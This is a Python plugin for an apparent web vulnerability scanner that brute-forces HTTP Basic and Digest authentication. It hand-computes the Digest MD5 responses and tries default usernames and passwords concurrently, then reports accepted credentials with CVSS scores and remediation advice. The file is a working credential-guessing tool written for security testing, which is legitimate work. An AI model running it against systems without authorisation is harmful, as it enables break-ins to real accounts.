"""
P4 - Brute force on HTTP authentication (Basic & Digest), hand-coded.
Category: A07:2025 Authentication Failures.

No auth library: we forge the headers ourselves.
  - Basic  : Authorization: Basic base64(user:pass).
  - Digest : MD5 challenge-response (RFC 2617) - we parse the
             WWW-Authenticate challenge, then compute
             HA1 = MD5(user:realm:pass)
             HA2 = MD5(method:uri)
             response = MD5(HA1:nonce:nc:cnonce:qop:HA2).

The scheme (Basic or Digest) is DETECTED from the server's 401 response.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import os
import re

import httpx

from core import AttackPlugin, Context, Finding, Severity, Target, register


def basic_header(user: str, password: str) -> str:
    raw = f"{user}:{password}".encode()
    return "Basic " + base64.b64encode(raw).decode()


def _md5(s: str) -> str:
    return hashlib.md5(s.encode()).hexdigest()


def parse_challenge(header: str) -> dict:
    """Parse a WWW-Authenticate: Digest realm=..., nonce=..., qop=... header."""
    scheme = "digest" if header.lower().startswith("digest") else "basic"
    params = dict(re.findall(r'(\w+)="?([^",]+)"?', header))
    params["_scheme"] = scheme
    return params


def digest_header(user: str, password: str, method: str, uri: str,
                  challenge: dict, cnonce: str | None = None, nc: str = "00000001") -> str:
    """Build the Authorization: Digest header (qop=auth)."""
    realm = challenge.get("realm", "")
    nonce = challenge.get("nonce", "")
    qop = challenge.get("qop", "auth").split(",")[0].strip()
    cnonce = cnonce or os.urandom(8).hex()

    ha1 = _md5(f"{user}:{realm}:{password}")
    ha2 = _md5(f"{method}:{uri}")
    if qop:
        response = _md5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}")
    else:
        response = _md5(f"{ha1}:{nonce}:{ha2}")

    parts = [
        f'username="{user}"', f'realm="{realm}"', f'nonce="{nonce}"',
        f'uri="{uri}"', f'response="{response}"',
    ]
    if qop:
        parts += [f'qop={qop}', f'nc={nc}', f'cnonce="{cnonce}"']
    if "opaque" in challenge:
        parts.append(f'opaque="{challenge["opaque"]}"')
    return "Digest " + ", ".join(parts)


@register
class HttpAuthPlugin(AttackPlugin):
    name = "http_auth"
    owasp_category = "A07:2025 Authentication Failures"

    DEFAULT_USERS = ["admin", "user", "test"]
    DEFAULT_PASSWORDS = ["password", "admin", "123456", "secret", "letmein"]

    async def run(self, target: Target, ctx: Context) -> list[Finding]:
        url = ctx.extra.get("auth_url", target.base_url)
        users = ctx.extra.get("users", self.DEFAULT_USERS)
        passwords = ctx.extra.get("passwords", self.DEFAULT_PASSWORDS)
        sem = asyncio.Semaphore(ctx.max_concurrency)
        findings: list[Finding] = []

        async with httpx.AsyncClient(timeout=ctx.timeout) as client:
            # 1. Trigger the 401 challenge to detect the scheme.
            try:
                probe = await client.get(url)
            except httpx.HTTPError as e:
                return [self._info(url, f"endpoint unreachable: {e}")]

            if probe.status_code != 401:
                return [self._info(url, "no HTTP authentication (401 expected)")]

            challenge = parse_challenge(probe.headers.get("www-authenticate", ""))
            scheme = challenge["_scheme"]
            uri = httpx.URL(url).path or "/"

            found: list[tuple[str, str]] = []
            lock = asyncio.Lock()

            async def attempt(u: str, p: str) -> None:
                if scheme == "basic":
                    hdr = basic_header(u, p)
                else:
                    hdr = digest_header(u, p, "GET", uri, challenge)
                async with sem:
                    try:
                        r = await client.get(url, headers={"Authorization": hdr})
                    except httpx.HTTPError:
                        return
                if r.status_code not in (401, 403):
                    async with lock:
                        found.append((u, p))

            await asyncio.gather(*(attempt(u, p) for u in users for p in passwords))

            for u, p in found:
                findings.append(Finding(
                    category="A07:2025 Authentication Failures",
                    title=f"Weak HTTP {scheme.capitalize()} auth: {u}:{p}",
                    severity=Severity.HIGH, cvss_score=8.7,
                    cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
                    evidence=f"Scheme {scheme}, realm='{challenge.get('realm','')}'. "
                             f"Credentials {u}:{p} accepted (non-401 HTTP).",
                    recommendation=("Strong passwords, never use Basic over cleartext "
                                    "HTTP, prefer app-level auth + MFA + lockout."),
                    target=url, plugin=self.name,
                    request=f"GET {url}  (Authorization: {scheme})"))

        if not findings:
            findings.append(self._info(url, "no weak HTTP credentials found"))
        return findings

    def _info(self, url: str, msg: str) -> Finding:
        return Finding(
            category="A07:2025 Authentication Failures",
            title="HTTP auth: nothing to report", severity=Severity.INFO,
            evidence=msg, recommendation="-", target=url, plugin=self.name)
